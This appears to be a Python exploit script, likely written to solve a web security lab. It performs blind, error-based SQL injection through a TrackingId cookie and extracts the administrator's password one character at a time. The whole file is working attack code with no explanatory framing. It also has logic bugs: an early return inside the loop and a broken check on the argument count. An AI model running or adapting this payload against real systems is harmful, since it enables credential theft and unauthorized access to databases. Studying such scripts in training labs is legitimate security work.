import requests
import sys
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_password(url):
    password_extracted = ""
    for i in range(1, 21):  # change back to 21 after testing smaller number
        for j in range(32, 126):
            sql_payload = "' || (SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND ascii(SUBSTR(password,%s,1)) = '%s') || '" % (i, j)
            sqli_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId': 'GOTHPU2722jc09EQ' + sqli_payload_encoded,
                       'session': 'AybgAkEH2eRziWHDBKJ14rRxzjKr4xk8'}
            r = requests.get(url, cookies=cookies,
                             verify=False, proxies=proxies)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
        return password_extracted


def main():
    if sys.argv != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example %s www.example.com " % sys.argv[0])
      #  sys.exit(-1)

    url = sys.argv[1]
    print("Retrieving administrator password....\n")
    administrator_password = sqli_password(url)
    print("\nThe administrator password is: %s" % administrator_password)


if __name__ == "__main__":
    main()
